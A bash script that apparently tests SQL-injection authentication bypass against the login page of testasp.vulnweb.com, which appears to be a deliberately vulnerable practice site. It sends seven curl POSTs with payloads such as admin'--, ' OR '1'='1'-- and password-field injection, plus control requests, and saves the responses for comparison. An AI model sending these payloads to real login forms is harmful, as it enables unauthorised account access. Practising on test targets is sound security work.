#!/usr/bin/env bash
# r2_auth step 2: SQLi auth-bypass POSTs against Login.asp ONLY (+ read-only observation)
cd "$(dirname "$0")" || exit 1
U=http://testasp.vulnweb.com
set -x

### S1: classic comment-out bypass  tfUName=admin'--
curl -sS -i --max-time 20 -c cj_s1.txt -D hdr_s1_admin_comment.txt -o body_s1_admin_comment.html \
  -X POST --data-urlencode "tfUName=admin'-- " --data-urlencode "tfUPass=x" \
  "$U/Login.asp"

### S2: tautology  ' OR '1'='1'--
curl -sS -i --max-time 20 -c cj_s2.txt -D hdr_s2_tautology.txt -o body_s2_tautology.html \
  -X POST --data-urlencode "tfUName=' OR '1'='1'-- " --data-urlencode "tfUPass=x" \
  "$U/Login.asp"

### S3: OR 1=1 comment, no quotes
curl -sS -i --max-time 20 -c cj_s3.txt -D hdr_s3_or1eq1.txt -o body_s3_or1eq1.html \
  -X POST --data-urlencode "tfUName=zz' OR 1=1-- " --data-urlencode "tfUPass=x" \
  "$U/Login.asp"

### S4: both fields injected (no comment relied on)
curl -sS -i --max-time 20 -c cj_s4.txt -D hdr_s4_bothfields.txt -o body_s4_bothfields.html \
  -X POST --data-urlencode "tfUName=' OR '1'='1" --data-urlencode "tfUPass=' OR '1'='1" \
  "$U/Login.asp"

### S5: password field only
curl -sS -i --max-time 20 -c cj_s5.txt -D hdr_s5_passonly_inj.txt -o body_s5_passonly_inj.html \
  -X POST --data-urlencode "tfUName=admin" --data-urlencode "tfUPass=x' OR '1'='1'-- " \
  "$U/Login.asp"

### S6: bare-quote syntax-error control (should be 500 or 200, NOT 302)
curl -sS -i --max-time 20 -c cj_s6.txt -D hdr_s6_quote_syntaxerr.txt -o body_s6_quote_syntaxerr.html \
  -X POST --data-urlencode "tfUName=admin'" --data-urlencode "tfUPass=x" \
  "$U/Login.asp"

### S7: valid user, wrong pass (0 rows but well-formed)  -> control for "1 row vs 0 rows"
curl -sS -i --max-time 20 -c cj_s7.txt -D hdr_s7_admin_wrongpass.txt -o body_s7_admin_wrongpass.html \
  -X POST --data-urlencode "tfUName=admin" --data-urlencode "tfUPass=definitely_wrong_pw" \
  "$U/Login.asp"
